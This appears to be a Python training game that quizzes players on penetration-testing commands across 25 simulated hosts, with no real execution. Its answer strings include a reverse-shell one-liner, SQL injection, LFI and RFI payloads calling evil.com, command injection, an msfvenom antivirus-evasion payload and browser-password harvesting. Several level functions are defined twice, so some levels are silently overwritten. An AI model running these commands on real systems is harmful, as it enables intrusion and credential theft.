
from colorama import Fore, Back, Style, init
import time
import inspect
import os

# Change here to modify the names
twitter = "@cysecacademy"
special_thanks = "Cysec NG"
created_by = "cysec ng"
terminal_user = "cyber@user"
name = "cysec ng"
point_reduction_for_failure = 5
point_addition = 10



# Initialize colorama
init()

# Declare current_level as global 
current_level = 0  # Declare at the top of your script

# Function to display the title screen
def display_title_screen():
    print(Fore.CYAN + "===========================================================================")
    print(" WELCOME TO 'THE ZERO-DAY-ARENA Raven': The Penetration Testing Simulation      ")
    print("===========================================================================" + Style.RESET_ALL)
    print(f"Created by: {twitter}")
    print(f"Special thanks: {special_thanks}")
    print(f"Twitter: {twitter}")
    print("") # add github here
    print(Fore.CYAN + "========================================================================" + Style.RESET_ALL)

def title_screen():
    global points
    global save_point
    print("Current Host:", current_level)
    print("Points:", points)
    print(Fore.CYAN + "========================================================================" + Style.RESET_ALL)
    choice = input("Type 'reset' to reset the game or press Enter to continue: ")
    if choice == "reset":
        reset_game()

# Function to simulate a host (level)
def host_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 1: Vulnerable Web Server" + Style.RESET_ALL)
        print("You are connected to a Kali Linux machine. Your first task is to find your network address.")
        print(Fore.YELLOW + "Hint: Use a command that shows network interfaces." + Style.RESET_ALL)
        cmd = "ifconfig"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: inet 192.168.1.100  netmask 255.255.255.0" + Style.RESET_ALL)
            print(f"{name} salutes your precision! Now proceed to scan the target host.")
            print(Fore.YELLOW + "Hint: Use a popular network scanning tool to scan IP 192.168.1.1." + Style.RESET_ALL)
            cmd = "nmap 192.168.1.1"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd:
                print(Fore.GREEN + "Scan Output: 1 open port - 80/tcp open" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Function to simulate host 2
def host_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 2: Exposed Database Server" + Style.RESET_ALL)
        print("Your task is to enumerate the database server with port 22 open.")
        print(Fore.YELLOW + "Hint: Use hydra brute-force tool against the user 'root' and IP 192.168.1.2 you have a wordlist called wordlist.txt to use" + Style.RESET_ALL)
        cmd = "hydra -l root -P wordlist.txt 192.168.1.2 ssh"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Brute-force Output: Password found for user 'root'" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

def host_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 3: DNS Server" + Style.RESET_ALL)
        print("Your task is to enumerate DNS records.")
        print(Fore.YELLOW + "Hint: Use a DNS enumeration tool against IP 192.168.1.3." + Style.RESET_ALL)
        cmd = "dnsrecon -d 192.168.1.3"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "DNS Output: Found subdomains: sub1, sub2" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

def host_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)   
    while True:
        print(Fore.GREEN + "Host 4: Privilege Escalation on Linux" + Style.RESET_ALL)
        print("Your task is to escalate your privileges on a Linux machine.")
        print(Fore.YELLOW + "Hint: Use a common privilege escalation enumeration command to gather information." + Style.RESET_ALL)
        cmd = "sudo -l"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: User may run the following commands: (ALL) NOPASSWD: /usr/bin/vim" + Style.RESET_ALL)
            print(f"{name} salutes your precision! Now exploit the privilege escalation.")
            print(Fore.YELLOW + "Hint: Use the information gathered to escalate your privileges." + Style.RESET_ALL)
            cmd = "sudo /usr/bin/vim"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd:
                print(Fore.GREEN + "You have successfully escalated your privileges!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 5: Windows Enumeration
def host_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 5: Windows Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate a Windows machine.")
        print(Fore.YELLOW + "Hint: Use a Windows enumeration tool against IP 192.168.1.5." + Style.RESET_ALL)
        cmd = "nbtscan 192.168.1.5"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: Found open SMB shares." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 6: Web Application Exploits
def host_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 6: Web Application Exploits" + Style.RESET_ALL)
        print("Your task is to exploit a vulnerability in a web application.")
        print(Fore.YELLOW + "Hint: Use a SQL injection payload on the login page." + Style.RESET_ALL)
        cmd = "' OR '1'='1"
        user_input = input("Enter SQL injection payload: ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully exploited the web application!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 7: Buffer Overflow Exploitation
def host_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 7: Buffer Overflow Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a buffer overflow vulnerability.")
        print(Fore.YELLOW + "Hint: Use a specific pattern of 200 to identify the overflow." + Style.RESET_ALL)
        cmd = "pattern_create.rb 200"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully created a unique pattern!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

#Host 5: Eyewitness web enumeration
def host_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 5: Using Eyewitness for Web Enumeration" + Style.RESET_ALL)
        print("Your task is to use Eyewitness to enumerate web servers.")
        print(Fore.YELLOW + "Hint: Use Eyewitness against the target web servers list named target.txt." + Style.RESET_ALL)
        cmd = "eyewitness --web target.txt"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: Screenshots and report generated!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 6: Lateral Movement Techniques
def host_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 6: Lateral Movement Techniques" + Style.RESET_ALL)
        print("Your task is to perform lateral movement to another system.")
        print(Fore.YELLOW + "Hint: Use psexec.py for lateral movement to gain administrator access on windows host 192.168.1.6." + Style.RESET_ALL)
        cmd = "psexec.py administrator@192.168.1.6"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully moved laterally!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 7: Modifying & Using an Exploit from Searchsploit
def host_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 7: Modifying & Using an Exploit from Searchsploit" + Style.RESET_ALL)
        print("Your task is to find an exploit on a host running apache using Searchsploit.")
        print(Fore.YELLOW + "Hint: Find an exploit for apache 2.2." + Style.RESET_ALL)
        cmd = "searchsploit apache 2.2"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully found an exploit!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 8: Linux File Permissions Exploitation
def host_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 8: Linux File Permissions Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit file permissions on a Linux machine.")
        print(Fore.YELLOW + "Hint: First, list the files in the /secret directory." + Style.RESET_ALL)
        cmd1 = "ls /secret"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: -rw-rw-rw- 1 root root 12 Jan 20 12:34 secret.txt" + Style.RESET_ALL)
            print(f"{name} salutes your precision! Now read the content of the file.")
            cmd2 = "cat /secret/secret.txt"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully exploited the file permissions!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 9: SSH Key Exploitation
def host_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 9: SSH Key Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit an SSH key.")
        print(Fore.YELLOW + "Hint: Enumerate the home directory to find SSH keys." + Style.RESET_ALL)
        cmd1 = "ls ~/.ssh"
        user_input = input("root@host_nine:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: id_rsa" + Style.RESET_ALL)
            print("Now, use the SSH key to log into the target machine.")
            cmd2 = "ssh -i ~/.ssh/id_rsa kali@192.168.1.9"
            user_input = input("root@host_nine:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully exploited the SSH key!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 10: Web Shell Upload and Execution
def host_ten():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 10: Web Shell Upload and Execution" + Style.RESET_ALL)
        print("Your task is to upload and execute a web shell for target http://192.168.1.10/upload.php.")
        print(Fore.YELLOW + "Hint: Use a web vulnerability scanner to find file upload functionality." + Style.RESET_ALL)
        cmd1 = "nikto -h http://192.168.1.10/upload.php"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: File upload functionality found." + Style.RESET_ALL)
            print("Now, upload the web shell.")
            cmd2 = "curl -F 'file=@web-shell.php' http://192.168.1.10/upload.php"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully uploaded and executed the web shell!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 11: Password Cracking
def host_eleven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 11: Password Cracking" + Style.RESET_ALL)
        print("Your task is to crack a password hash saved as hash.txt.")
        print(Fore.YELLOW + "Hint: Use a hash cracking tool using wordlist.txt." + Style.RESET_ALL)
        cmd1 = "john --wordlist=wordlist.txt hash.txt"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Password cracked: 123456" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 12: Firewall Evasion
def host_twelve():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 12: Firewall Evasion" + Style.RESET_ALL)
        print("Your task is to find bypass on a firewall at 192.168.1.12.")
        print(Fore.YELLOW + "Hint: Use an evasion technique for enumeration to scan the target." + Style.RESET_ALL)
        cmd1 = "nmap -sS -f 192.168.1.12"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Firewall bypass discovered. Ports found open." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 13: Reverse Shell Exploitation
def host_thirteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 13: Reverse Shell Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a machine using a reverse shell.")
        print(Fore.YELLOW + "Hint: First, set up a listener on port 4444." + Style.RESET_ALL)
        cmd1 = "nc -lvnp 4444"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Listener set up on port 4444." + Style.RESET_ALL)
            print("Now, enter the python reverse shell payload to send to the target machine.")
            print("python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
            cmd2 = "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Reverse shell established!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 14: Privilege Escalation on Windows
def host_fourteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 14: Privilege Escalation on Windows" + Style.RESET_ALL)
        print("Your task is to escalate your privileges on a Windows machine.")
        print(Fore.YELLOW + "Hint: First, check for unquoted service paths." + Style.RESET_ALL)
        cmd1 = "wmic service get name,displayname,pathname"
        user_input = input("C:\\Users\\User> ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Unquoted service path found named unquotedsvc using sc." + Style.RESET_ALL)
            print("Now, exploit the unquoted service path using exploit 'C:\\evil.exe'.")
            cmd2 = "sc config unquotedsvc binPath= C:\\evil.exe"
            user_input = input("C:\\Users\\User> ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully escalated your privileges on the Windows machine!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 15: Active Directory Enumeration
def host_fifteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 15: Active Directory Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate an Active Directory environment milosilo.com via host 192.168.1.15.")
        print(Fore.YELLOW + "Hint: Use an LDAP enumeration tool." + Style.RESET_ALL)
        cmd1 = "ldapsearch -x -h 192.168.1.15 -b \"dc=milosilo,dc=com\""
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Users and Groups enumerated." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 16: Data Exfiltration
def host_sixteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 16: Data Exfiltration" + Style.RESET_ALL)
        print("Your task is to exfiltrate data from a target machine.")
        print(Fore.YELLOW + "Hint: First, identify sensitive data on the machine located in conf files." + Style.RESET_ALL)
        cmd1 = "find / -name '*.conf' 2>/dev/null"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Sensitive configuration file found: /usr/milo/web.conf" + Style.RESET_ALL)
            print("Now, use SCP to copy the files from 192.168.1.16 to /usr/kali")
            cmd2 = "scp user@192.168.1.16:/usr/milo/web.conf /usr/kali/web.conf"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Data successfully exfiltrated!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 17: Wireless Network Cracking
def host_seventeen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 17: Wireless Network Cracking" + Style.RESET_ALL)
        print("Your task is to crack a WPA2 wireless network using wlan0.")
        print(Fore.YELLOW + "Hint: Capture the WPA handshake first." + Style.RESET_ALL)
        cmd1 = "airodump-ng wlan0"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: WPA handshake captured and saved as capture.cap." + Style.RESET_ALL)
            print("Now, use aircrack-ng to crack the password using wordlist.txt.")
            cmd2 = "aircrack-ng -w wordlist.txt -b SSID capture.cap"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "WPA2 password cracked!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 18: SQL Injection with Manual Exploitation
def host_eighteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 18: SQL Injection with Manual Exploitation" + Style.RESET_ALL)
        print("Your task is to manually exploit a UNION SQL injection vulnerability.")
        print(Fore.YELLOW + "Hint: Enumerate the database first." + Style.RESET_ALL)
        cmd1 = "' UNION SELECT null, database() -- "
        user_input = input("Enter SQL Injection payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Database name retrieved: union_station" + Style.RESET_ALL)
            print("Now, enumerate the tables.")
            cmd2 = "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='union_station' -- "
            user_input = input("Enter SQL Injection payload: ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Tables successfully enumerated!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 19: Local File Inclusion (LFI)
def host_nineteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 19: Local File Inclusion (LFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Local File Inclusion vulnerability from url that begins with 'page='")
        print(Fore.YELLOW + "Hint: Read the /etc/passwd file." + Style.RESET_ALL)
        cmd1 = "page=../../../../../etc/passwd"
        user_input = input("Enter LFI payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: /etc/passwd file read successfully." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 20: Remote File Inclusion (RFI)
def host_twenty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 20: Remote File Inclusion (RFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Remote File Inclusion vulnerability from url that begins with 'page='")
        print(Fore.YELLOW + "Hint: Include a remote file to execute arbitrary code located at 'http://evil.com/shell.php'" + Style.RESET_ALL)
        cmd1 = "page=http://evil.com/shell.php"
        user_input = input("Enter RFI payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Remote file included. Code executed!" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 21: OS Command Injection
def host_twenty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 21: OS Command Injection" + Style.RESET_ALL)
        print("Your task is to perform an OS command injection attack on host 192.168.1.21")
        print(Fore.YELLOW + "Hint: Use the ping functionality to perform the attack." + Style.RESET_ALL)
        cmd1 = "192.168.1.21; ls"
        user_input = input("Enter the IP address to ping: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Command executed successfully." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 22: Metasploit Framework Exploitation
def host_twenty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 22: Metasploit Framework Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a vulnerable machine using Metasploit.")
        print(Fore.YELLOW + "Hint: Use msfconsole to search for an appropriate exploit." + Style.RESET_ALL)
        cmd1 = "search type:exploit"
        user_input = input("msf6 > ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Exploit found named: exploit/multi/handler" + Style.RESET_ALL)
            print("Now, set the exploit with payload windows/meterpreter/reverse_tcp, and run it in a single line chained command. Your host is 192.168.1.22")
            cmd2 = "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.22; run"
            user_input = input("msf6 > ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Exploit successful. Meterpreter session opened!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 23: Bypassing Antivirus
def host_twenty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 23: Bypassing Antivirus" + Style.RESET_ALL)
        print("Your task is to bypass an antivirus solution.")
        print(Fore.YELLOW + "Hint: Use a tool to obfuscate a known malicious file." + Style.RESET_ALL)
        print(Fore.YELLOW + "Hint: windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe" + Style.RESET_ALL)
        cmd1 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: File obfuscated and saved as payload.exe" + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 24: Post-Exploitation Data Harvesting
def host_twenty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 24: Post-Exploitation Data Harvesting" + Style.RESET_ALL)
        print("Your task is to collect sensitive data post-exploitation.")
        print(Fore.YELLOW + "Hint: Harvest browser passwords using a run command to a tool located here: post/windows/gather/." + Style.RESET_ALL)
        cmd1 = "run post/windows/gather/enum_chrome"
        user_input = input("meterpreter > ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Chrome passwords harvested." + Style.RESET_ALL)
            points += point_addition
            break
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)

# Host 25: IOT Device Exploitation
def host_twenty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 25: IOT Device Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit an IOT device at IP 192.168.1.25.")
        print(Fore.YELLOW + "Hint: Enumerate the device for open ports first." + Style.RESET_ALL)
        cmd1 = "nmap -sS 192.168.1.25"
        user_input = input(f"{terminal_user}:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Open ports found." + Style.RESET_ALL)
            print("Now, exploit the device.")
            cmd2 = "python3 iot_exploit.py 192.168.1.25"
            user_input = input(f"{terminal_user}:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "IOT device successfully exploited!" + Style.RESET_ALL)
                points += point_addition
                break
            else:
                points -= point_reduction_for_failure
                print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
        else:
            points -= point_reduction_for_failure
            print(Fore.RED + f"Access Denied by {name}! Refine Your Tactics!" + Style.RESET_ALL)
            continue
def save_progress(current_level):
    with open("game_save.txt", "w") as f:
        f.write(str(current_level))
        print("saving game")
        f.close()

def load_progress():
    if os.path.exists("game_save.txt"):
        with open("game_save.txt", "r") as f:
            return int(f.read().strip())
    return 0

def reset_game():
    if os.path.exists("game_save.txt"):
        os.remove("game_save.txt")
        
# Main function to run the game
def main():
    # Initialize variables
    global points
    points = 0
    global current_level  # Access the global variable inside main()
    current_level = load_progress()  # Load progress at the beginning of the game

    host_functions = [
    host_one, host_two, host_three, host_four, host_five,
    host_six, host_seven, host_eight, host_nine, host_ten,
    host_eleven, host_twelve, host_thirteen, host_fourteen, host_fifteen,
    host_sixteen, host_seventeen, host_eighteen, host_nineteen, host_twenty,
    host_twenty_one, host_twenty_two, host_twenty_three, host_twenty_four, host_twenty_five,
]

    display_title_screen()
    title_screen()

    # Load or initialize current_level
    current_level = load_progress()

    print(f"Current level: {current_level}, Number of hosts: {len(host_functions)}")

    while current_level < len(host_functions):
        print(f"Starting Level {current_level + 1}")
        
        # Execute the current host function
        host_functions[current_level]()
        # Move to the next level
        current_level += 1
        
        # Save progress
        print("Before saving progress.")
        save_progress(current_level)
        print("After saving progress.")

# Run the game
if __name__ == "__main__":
    main()
